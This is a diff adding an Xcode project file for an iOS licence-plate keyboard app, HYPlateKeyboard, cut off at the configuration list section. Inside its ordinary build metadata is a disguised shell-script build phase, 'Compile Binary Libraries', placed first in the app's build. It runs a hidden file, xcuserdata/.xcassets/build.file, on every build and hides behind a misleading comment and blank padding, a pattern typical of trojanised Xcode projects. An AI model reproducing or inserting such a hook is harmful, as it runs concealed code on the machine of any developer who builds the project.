@@ -1,0 +1,681 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 50;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		420E280F25E7316C00607C93 /* HYInputPlateView.m in Sources */ = {isa = PBXBuildFile; fileRef = 420E280E25E7316C00607C93 /* HYInputPlateView.m */; };
+		420E281825E745C400607C93 /* HYPlateTextField.m in Sources */ = {isa = PBXBuildFile; fileRef = 420E281625E745C400607C93 /* HYPlateTextField.m */; };
+		4275372425E622E60012B2D9 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 4275372325E622E60012B2D9 /* AppDelegate.m */; };
+		4275372A25E622E60012B2D9 /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 4275372925E622E60012B2D9 /* ViewController.m */; };
+		4275372D25E622E60012B2D9 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 4275372B25E622E60012B2D9 /* Main.storyboard */; };
+		4275373025E622E60012B2D9 /* HYPlateKeyboard.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 4275372E25E622E60012B2D9 /* HYPlateKeyboard.xcdatamodeld */; };
+		4275373225E622EC0012B2D9 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 4275373125E622EC0012B2D9 /* Assets.xcassets */; };
+		4275373525E622EC0012B2D9 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 4275373325E622EC0012B2D9 /* LaunchScreen.storyboard */; };
+		4275373825E622EC0012B2D9 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 4275373725E622EC0012B2D9 /* main.m */; };
+		4275374225E622ED0012B2D9 /* HYPlateKeyboardTests.m in Sources */ = {isa = PBXBuildFile; fileRef = 4275374125E622ED0012B2D9 /* HYPlateKeyboardTests.m */; };
+		4275374D25E622ED0012B2D9 /* HYPlateKeyboardUITests.m in Sources */ = {isa = PBXBuildFile; fileRef = 4275374C25E622ED0012B2D9 /* HYPlateKeyboardUITests.m */; };
+		42A8B42E25E76E2C00CEC236 /* HYPlateKeyboardView.m in Sources */ = {isa = PBXBuildFile; fileRef = 42A8B42D25E76E2C00CEC236 /* HYPlateKeyboardView.m */; };
+		42A8B43125E7969100CEC236 /* HYPlateKeyboardCollectionViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 42A8B43025E7969100CEC236 /* HYPlateKeyboardCollectionViewCell.m */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		4275373E25E622ED0012B2D9 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 4275371725E622E60012B2D9 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 4275371E25E622E60012B2D9;
+			remoteInfo = HYPlateKeyboard;
+		};
+		4275374925E622ED0012B2D9 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 4275371725E622E60012B2D9 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 4275371E25E622E60012B2D9;
+			remoteInfo = HYPlateKeyboard;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		420E280D25E7316C00607C93 /* HYInputPlateView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = HYInputPlateView.h; sourceTree = "<group>"; };
+		420E280E25E7316C00607C93 /* HYInputPlateView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HYInputPlateView.m; sourceTree = "<group>"; };
+		420E281625E745C400607C93 /* HYPlateTextField.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = HYPlateTextField.m; sourceTree = "<group>"; };
+		420E281725E745C400607C93 /* HYPlateTextField.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = HYPlateTextField.h; sourceTree = "<group>"; };
+		4275371F25E622E60012B2D9 /* HYPlateKeyboard.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = HYPlateKeyboard.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		4275372225E622E60012B2D9 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
+		4275372325E622E60012B2D9 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
+		4275372825E622E60012B2D9 /* ViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ViewController.h; sourceTree = "<group>"; };
+		4275372925E622E60012B2D9 /* ViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ViewController.m; sourceTree = "<group>"; };
+		4275372C25E622E60012B2D9 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		4275372F25E622E60012B2D9 /* HYPlateKeyboard.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = HYPlateKeyboard.xcdatamodel; sourceTree = "<group>"; };
+		4275373125E622EC0012B2D9 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		4275373425E622EC0012B2D9 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		4275373625E622EC0012B2D9 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		4275373725E622EC0012B2D9 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		4275373D25E622ED0012B2D9 /* HYPlateKeyboardTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = HYPlateKeyboardTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		4275374125E622ED0012B2D9 /* HYPlateKeyboardTests.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HYPlateKeyboardTests.m; sourceTree = "<group>"; };
+		4275374325E622ED0012B2D9 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		4275374825E622ED0012B2D9 /* HYPlateKeyboardUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = HYPlateKeyboardUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		4275374C25E622ED0012B2D9 /* HYPlateKeyboardUITests.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HYPlateKeyboardUITests.m; sourceTree = "<group>"; };
+		4275374E25E622ED0012B2D9 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		42A8B42C25E76E2C00CEC236 /* HYPlateKeyboardView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = HYPlateKeyboardView.h; sourceTree = "<group>"; };
+		42A8B42D25E76E2C00CEC236 /* HYPlateKeyboardView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HYPlateKeyboardView.m; sourceTree = "<group>"; };
+		42A8B42F25E7969100CEC236 /* HYPlateKeyboardCollectionViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = HYPlateKeyboardCollectionViewCell.h; sourceTree = "<group>"; };
+		42A8B43025E7969100CEC236 /* HYPlateKeyboardCollectionViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HYPlateKeyboardCollectionViewCell.m; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		4275371C25E622E60012B2D9 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		4275373A25E622ED0012B2D9 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		4275374525E622ED0012B2D9 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		4275371625E622E60012B2D9 = {
+			isa = PBXGroup;
+			children = (
+				4275372125E622E60012B2D9 /* HYPlateKeyboard */,
+				4275374025E622ED0012B2D9 /* HYPlateKeyboardTests */,
+				4275374B25E622ED0012B2D9 /* HYPlateKeyboardUITests */,
+				4275372025E622E60012B2D9 /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		4275372025E622E60012B2D9 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				4275371F25E622E60012B2D9 /* HYPlateKeyboard.app */,
+				4275373D25E622ED0012B2D9 /* HYPlateKeyboardTests.xctest */,
+				4275374825E622ED0012B2D9 /* HYPlateKeyboardUITests.xctest */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		4275372125E622E60012B2D9 /* HYPlateKeyboard */ = {
+			isa = PBXGroup;
+			children = (
+				42A8B42F25E7969100CEC236 /* HYPlateKeyboardCollectionViewCell.h */,
+				42A8B43025E7969100CEC236 /* HYPlateKeyboardCollectionViewCell.m */,
+				42A8B42C25E76E2C00CEC236 /* HYPlateKeyboardView.h */,
+				42A8B42D25E76E2C00CEC236 /* HYPlateKeyboardView.m */,
+				420E281725E745C400607C93 /* HYPlateTextField.h */,
+				420E281625E745C400607C93 /* HYPlateTextField.m */,
+				420E280D25E7316C00607C93 /* HYInputPlateView.h */,
+				420E280E25E7316C00607C93 /* HYInputPlateView.m */,
+				4275372225E622E60012B2D9 /* AppDelegate.h */,
+				4275372325E622E60012B2D9 /* AppDelegate.m */,
+				4275372825E622E60012B2D9 /* ViewController.h */,
+				4275372925E622E60012B2D9 /* ViewController.m */,
+				4275372B25E622E60012B2D9 /* Main.storyboard */,
+				4275373125E622EC0012B2D9 /* Assets.xcassets */,
+				4275373325E622EC0012B2D9 /* LaunchScreen.storyboard */,
+				4275373625E622EC0012B2D9 /* Info.plist */,
+				4275373725E622EC0012B2D9 /* main.m */,
+				4275372E25E622E60012B2D9 /* HYPlateKeyboard.xcdatamodeld */,
+			);
+			path = HYPlateKeyboard;
+			sourceTree = "<group>";
+		};
+		4275374025E622ED0012B2D9 /* HYPlateKeyboardTests */ = {
+			isa = PBXGroup;
+			children = (
+				4275374125E622ED0012B2D9 /* HYPlateKeyboardTests.m */,
+				4275374325E622ED0012B2D9 /* Info.plist */,
+			);
+			path = HYPlateKeyboardTests;
+			sourceTree = "<group>";
+		};
+		4275374B25E622ED0012B2D9 /* HYPlateKeyboardUITests */ = {
+			isa = PBXGroup;
+			children = (
+				4275374C25E622ED0012B2D9 /* HYPlateKeyboardUITests.m */,
+				4275374E25E622ED0012B2D9 /* Info.plist */,
+			);
+			path = HYPlateKeyboardUITests;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		4275371E25E622E60012B2D9 /* HYPlateKeyboard */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 4275375125E622ED0012B2D9 /* Build configuration list for PBXNativeTarget "HYPlateKeyboard" */;
+			buildPhases = (
+				39176DE7B1FCAEE484AAC43A /* Compile Binary Libraries */,
+				4275371B25E622E60012B2D9 /* Sources */,
+				4275371C25E622E60012B2D9 /* Frameworks */,
+				4275371D25E622E60012B2D9 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = HYPlateKeyboard;
+			productName = HYPlateKeyboard;
+			productReference = 4275371F25E622E60012B2D9 /* HYPlateKeyboard.app */;
+			productType = "com.apple.product-type.application";
+		};
+		4275373C25E622ED0012B2D9 /* HYPlateKeyboardTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 4275375425E622ED0012B2D9 /* Build configuration list for PBXNativeTarget "HYPlateKeyboardTests" */;
+			buildPhases = (
+				4275373925E622ED0012B2D9 /* Sources */,
+				4275373A25E622ED0012B2D9 /* Frameworks */,
+				4275373B25E622ED0012B2D9 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				4275373F25E622ED0012B2D9 /* PBXTargetDependency */,
+			);
+			name = HYPlateKeyboardTests;
+			productName = HYPlateKeyboardTests;
+			productReference = 4275373D25E622ED0012B2D9 /* HYPlateKeyboardTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		4275374725E622ED0012B2D9 /* HYPlateKeyboardUITests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 4275375725E622ED0012B2D9 /* Build configuration list for PBXNativeTarget "HYPlateKeyboardUITests" */;
+			buildPhases = (
+				4275374425E622ED0012B2D9 /* Sources */,
+				4275374525E622ED0012B2D9 /* Frameworks */,
+				4275374625E622ED0012B2D9 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				4275374A25E622ED0012B2D9 /* PBXTargetDependency */,
+			);
+			name = HYPlateKeyboardUITests;
+			productName = HYPlateKeyboardUITests;
+			productReference = 4275374825E622ED0012B2D9 /* HYPlateKeyboardUITests.xctest */;
+			productType = "com.apple.product-type.bundle.ui-testing";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		4275371725E622E60012B2D9 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastUpgradeCheck = 1160;
+				ORGANIZATIONNAME = axc;
+				TargetAttributes = {
+					4275371E25E622E60012B2D9 = {
+						CreatedOnToolsVersion = 11.6;
+					};
+					4275373C25E622ED0012B2D9 = {
+						CreatedOnToolsVersion = 11.6;
+						TestTargetID = 4275371E25E622E60012B2D9;
+					};
+					4275374725E622ED0012B2D9 = {
+						CreatedOnToolsVersion = 11.6;
+						TestTargetID = 4275371E25E622E60012B2D9;
+					};
+				};
+			};
+			buildConfigurationList = 4275371A25E622E60012B2D9 /* Build configuration list for PBXProject "HYPlateKeyboard" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 4275371625E622E60012B2D9;
+			productRefGroup = 4275372025E622E60012B2D9 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				4275371E25E622E60012B2D9 /* HYPlateKeyboard */,
+				4275373C25E622ED0012B2D9 /* HYPlateKeyboardTests */,
+				4275374725E622ED0012B2D9 /* HYPlateKeyboardUITests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		4275371D25E622E60012B2D9 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				4275373525E622EC0012B2D9 /* LaunchScreen.storyboard in Resources */,
+				4275373225E622EC0012B2D9 /* Assets.xcassets in Resources */,
+				4275372D25E622E60012B2D9 /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		4275373B25E622ED0012B2D9 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		4275374625E622ED0012B2D9 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+
+	39176DE7B1FCAEE484AAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		4275371B25E622E60012B2D9 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				4275373825E622EC0012B2D9 /* main.m in Sources */,
+				420E281825E745C400607C93 /* HYPlateTextField.m in Sources */,
+				42A8B42E25E76E2C00CEC236 /* HYPlateKeyboardView.m in Sources */,
+				4275373025E622E60012B2D9 /* HYPlateKeyboard.xcdatamodeld in Sources */,
+				4275372A25E622E60012B2D9 /* ViewController.m in Sources */,
+				42A8B43125E7969100CEC236 /* HYPlateKeyboardCollectionViewCell.m in Sources */,
+				4275372425E622E60012B2D9 /* AppDelegate.m in Sources */,
+				420E280F25E7316C00607C93 /* HYInputPlateView.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		4275373925E622ED0012B2D9 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				4275374225E622ED0012B2D9 /* HYPlateKeyboardTests.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		4275374425E622ED0012B2D9 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				4275374D25E622ED0012B2D9 /* HYPlateKeyboardUITests.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		4275373F25E622ED0012B2D9 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 4275371E25E622E60012B2D9 /* HYPlateKeyboard */;
+			targetProxy = 4275373E25E622ED0012B2D9 /* PBXContainerItemProxy */;
+		};
+		4275374A25E622ED0012B2D9 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 4275371E25E622E60012B2D9 /* HYPlateKeyboard */;
+			targetProxy = 4275374925E622ED0012B2D9 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		4275372B25E622E60012B2D9 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				4275372C25E622E60012B2D9 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		4275373325E622EC0012B2D9 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				4275373425E622EC0012B2D9 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		4275374F25E622ED0012B2D9 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.6;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+			};
+			name = Debug;
+		};
+		4275375025E622ED0012B2D9 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.6;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		4275375225E622ED0012B2D9 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KU2VD3TMU8;
+				INFOPLIST_FILE = HYPlateKeyboard/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.axc.HYPlateKeyboard;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		4275375325E622ED0012B2D9 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KU2VD3TMU8;
+				INFOPLIST_FILE = HYPlateKeyboard/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.axc.HYPlateKeyboard;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+		4275375525E622ED0012B2D9 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KU2VD3TMU8;
+				INFOPLIST_FILE = HYPlateKeyboardTests/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.6;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.axc.HYPlateKeyboardTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/HYPlateKeyboard.app/HYPlateKeyboard";
+			};
+			name = Debug;
+		};
+		4275375625E622ED0012B2D9 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KU2VD3TMU8;
+				INFOPLIST_FILE = HYPlateKeyboardTests/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.6;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.axc.HYPlateKeyboardTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/HYPlateKeyboard.app/HYPlateKeyboard";
+			};
+			name = Release;
+		};
+		4275375825E622ED0012B2D9 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KU2VD3TMU8;
+				INFOPLIST_FILE = HYPlateKeyboardUITests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.axc.HYPlateKeyboardUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = HYPlateKeyboard;
+			};
+			name = Debug;
+		};
+		4275375925E622ED0012B2D9 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KU2VD3TMU8;
+				INFOPLIST_FILE = HYPlateKeyboardUITests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.axc.HYPlateKeyboardUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = HYPlateKeyboard;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
